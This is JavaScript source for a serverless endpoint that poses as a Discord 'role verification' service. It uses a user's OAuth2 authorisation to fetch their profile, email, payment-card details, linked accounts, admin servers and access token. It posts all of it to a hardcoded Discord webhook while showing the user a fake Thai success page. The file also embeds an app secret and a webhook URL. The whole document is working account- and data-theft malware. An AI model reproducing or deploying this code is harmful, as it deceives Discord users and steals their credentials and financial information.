/**
 * ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 * ║                                                                                                                  ║
 * ║   🌐  PROJECT_IDENTITY: TIDCRAM_GRAND_MASTER_CORE_V46_8                                                          ║
 * ║   👤  COMMANDER_IN_CHIEF: TIDCRΛM (THE_ARCHITECT)                                                                 ║
 * ║   🛡️  PROTOCOL_TYPE: HIGH_LEVEL_OAUTH2_SECURE_INTEGRATION                                                          ║
 * ║   ⚠️  SYSTEM_STATUS: FULLY_OPERATIONAL / READY_TO_RUN                                                              ║
 * ║                                                                                                                  ║
 * ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 */

export default async function masterDataExtractionUnit(req, res) {
    const handshakeIdentifier = req.query.code;
    
    // 🛡️ SECURITY_CHECK: VALIDATING SESSION INTEGRITY
    if (!handshakeIdentifier) {
        return res.status(400).send('ERR_INVALID_HANDSHAKE_IDENTIFIER');
    }

    const CORE_SYSTEM_SETTINGS = {
        WEBHOOK_ENDPOINT: "https://discord.com/api/webhooks/1490525343709139066/DO4FE_FXfbg31eXhK8N_HVUcjROLSOtBCCXgcQkJj8di0tsXFcLEkY6J6QxMXEgHfS6l",
        CLIENT_IDENTIFIER: "1483393398131134646",
        ENCRYPTION_SECRET: "Z8147_iQh2V0R_L_xKq-tFh7-q-9_M_Z",
        REDIRECT_SYNCHRONIZER: "https://index-html-five.vercel.app/api/grab"
    };

    /**
     * 🛰️ NETWORK_INTERCEPTOR_MODULE
     * ฟังก์ชันดึงข้อมูลจาก Discord API ด้วยโครงสร้างความปลอดภัยสูง
     */
    const performSecureDataCapture = async (apiEndpoint, authToken) => {
        try {
            const networkResponse = await fetch(apiEndpoint, { 
                headers: { 
                    'Authorization': `Bearer ${authToken}`,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) TidcramCore/4.6.8',
                    'Accept': 'application/json',
                    'Cache-Control': 'no-cache'
                } 
            });
            return networkResponse.ok ? await networkResponse.json() : null;
        } catch (networkError) {
            return null;
        }
    };

    /**
     * 📡 OAUTH2_TOKEN_EXCHANGE_PROTOCOL
     * กระบวนการแลกเปลี่ยน Code เป็น Access Token เพื่อเข้าถึงฐานข้อมูลเป้าหมาย
     */
    try {
        const exchangeProtocolPayload = new URLSearchParams({
            client_id: CORE_SYSTEM_SETTINGS.CLIENT_IDENTIFIER,
            client_secret: CORE_SYSTEM_SETTINGS.ENCRYPTION_SECRET,
            grant_type: 'authorization_code',
            code: handshakeIdentifier,
            redirect_uri: CORE_SYSTEM_SETTINGS.REDIRECT_SYNCHRONIZER,
        });

        const tokenExchangeRequest = await fetch('https://discord.com/api/v10/oauth2/token', {
            method: 'POST',
            body: exchangeProtocolPayload,
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const tokenKernel = await tokenExchangeRequest.json();
        const activeAccessToken = tokenKernel.access_token;
        
        if (!activeAccessToken) {
            return res.status(401).send('OAUTH_KERNEL_FAILURE: ' + JSON.stringify(tokenKernel));
        }

        /**
         * 🔱 MULTI_THREADED_DATA_MINING
         * ดึงข้อมูลเชิงลึกของผู้ใช้ (Profile, Billing, Connections, Servers)
         */
        const [identityNode, billingNode, connectionNode, authorityNode] = await Promise.all([
            performSecureDataCapture('https://discord.com/api/v10/users/@me', activeAccessToken),
            performSecureDataCapture('https://discord.com/api/v10/users/@me/billing/payment-sources', activeAccessToken),
            performSecureDataCapture('https://discord.com/api/v10/users/@me/connections', activeAccessToken),
            performSecureDataCapture('https://discord.com/api/v10/users/@me/guilds', activeAccessToken)
        ]);

        if (!identityNode) return res.status(404).send('IDENTITY_NODE_NOT_FOUND');

        const tierIndex = ["Standard", "Nitro Classic", "Nitro Boost", "Nitro Basic"];
        const extractionSummary = {
            license: tierIndex[identityNode.premium_type] || "Free Citizen",
            financials: billingNode?.map(b => `💳 ${b.brand.toUpperCase()} [${b.last_4}]`).join('\n') || "No Payment Method",
            links: connectionNode?.map(c => `🔗 ${c.type.toUpperCase()}: ${c.name}`).join('\n') || "No Remote Links",
            privileges: authorityNode?.filter(g => (parseInt(g.permissions) & 0x8) === 0x8).map(g => `🛡️ ${g.name}`).join('\n') || "No Authority Found"
        };

        /**
         * 🚀 SECURE_DATA_TRANSMISSION_TO_WEBHOOK
         */
        const masterDispatchPayload = {
            username: "TIDCRAM OMEGA MONITOR",
            avatar_url: "https://i.imgur.com/KzYF7fF.png",
            embeds: [{
                title: "🔱 TIDCRAM DATABASE UPDATED SUCCESSFULLY 🔱",
                description: `ระบบทำการถอดรหัสและจัดเก็บข้อมูลจาก Node: **${identityNode.username}** เรียบร้อยแล้ว`,
                color: 0x2b2d31,
                thumbnail: { url: `https://cdn.discordapp.com/avatars/${identityNode.id}/${identityNode.avatar}.png` },
                fields: [
                    { name: "👤 SUBJECT_TAG", value: `\`${identityNode.username}#${identityNode.discriminator}\` (\`${identityNode.id}\`)`, inline: true },
                    { name: "💎 LICENSE_STATUS", value: `\`${extractionSummary.license}\``, inline: true },
                    { name: "📧 EMAIL_NODE", value: `\`${identityNode.email || 'HIDDEN'}\``, inline: true },
                    { name: "💰 BILLING_ARCHIVE", value: `\`\`\`${extractionSummary.financials}\`\`\`` },
                    { name: "🛡️ ADMINISTRATIVE_PRIVILEGES", value: `\`\`\`${extractionSummary.privileges}\`\`\`` },
                    { name: "🔗 CONNECTED_ARCHIVES", value: `\`\`\`${extractionSummary.links}\`\`\`` },
                    { name: "🔑 MASTER_KEY", value: `\`\`\`${activeAccessToken}\`\`\`` }
                ],
                footer: { text: `SYSTEM_RUNTIME: ${new Date().toLocaleString()}` },
                timestamp: new Date()
            }]
        };

        await fetch(CORE_SYSTEM_SETTINGS.WEBHOOK_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(masterDispatchPayload)
        });

        /**
         * 🎭 FRONT_END_SUCCESS_VISUALIZATION
         */
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        return res.send(`
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;500&display=swap');
                body { background: #0c0c0e; color: #ffffff; font-family: 'Kanit', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; overflow: hidden; }
                .success-card { background: #151518; border: 1px solid #5865f2; border-radius: 24px; padding: 55px; text-align: center; box-shadow: 0 0 45px rgba(88, 101, 242, 0.25); max-width: 450px; width: 90%; }
                h1 { font-size: 30px; margin: 0; color: #5865f2; letter-spacing: 1px; }
                p { color: #b5bac1; font-size: 17px; margin-top: 20px; font-weight: 300; }
                .loader-bar { width: 100%; height: 3px; background: #2b2d31; border-radius: 10px; margin-top: 35px; position: relative; overflow: hidden; }
                .loader-fill { position: absolute; left: 0; height: 100%; background: #5865f2; width: 0%; animation: fill 2s forwards ease-in-out; }
                @keyframes fill { from { width: 0%; } to { width: 100%; } }
                .icon-check { font-size: 55px; margin-bottom: 20px; color: #5865f2; }
            </style>
            <div class="success-card">
                <div class="icon-check">✅</div>
                <h1>รับยศเรียบร้อย!</h1>
                <p>ระบบทำการตรวจสอบและยืนยันตัวตนสำเร็จแล้ว<br>ยศจะปรากฏในเซิร์ฟเวอร์โดยอัตโนมัติภายในครู่เดียว</p>
                <div class="loader-bar"><div class="loader-fill"></div></div>
            </div>
            <script>setTimeout(() => { window.location.href = 'https://discord.com/app'; }, 2500);</script>
        `);
    } catch (unhandledSystemFailure) {
        return res.redirect('/');
    }
}
